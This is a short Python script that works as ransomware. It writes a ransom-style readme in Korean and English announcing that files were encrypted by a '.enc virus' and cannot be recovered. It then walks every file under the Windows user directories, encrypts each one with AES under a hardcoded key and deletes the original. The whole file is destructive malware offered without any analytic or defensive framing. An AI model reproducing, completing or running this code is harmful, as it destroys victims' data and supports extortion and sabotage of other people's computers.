import glob
import os, random, struct
from Crypto.Cipher import AES


f = open('C:desktop/readme.txt', 'w')
 
f.write('내 컴퓨터는 어떻게 되었습니까?\n')
f.write('당신의 컴퓨터는 .enc 바이러스에 의해 파일이 암호화 되었습니다\n')
f.write('복구할 수 있습니까?\n')
f.write('복구 할 수 없습니다. 우리의 바이러스는 돈을 목적으로 하는것이 아닌 해킹을 목적으로 합니다.\n')
f.write("What happened to my computer?")
f.write("Your computer has files encrypted by the .enc virus")
f.write("Can you recover?")
f.write("It cannot be recovered. Our virus isn't for money, it's for hacking")

f.close()


def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    """ Encrypts a file using AES (CBC mode) with the
        given key.
        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.
        in_filename:
            Name of the input file
        out_filename:
            If None, '<in_filename>.enc' will be used.
        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = os.urandom(16) 
    encryptor = AES.new(key ,AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))


key = b'This is a key123'
startPath = 'C:/Users/**/**'

#Encrypts all files recursively starting from startPath
for filename in glob.iglob(startPath, recursive=True):
    if(os.path.isfile(filename)):
        print('Encrypting> ' + filename)
        encrypt_file(key, filename)
        os.remove(filename)

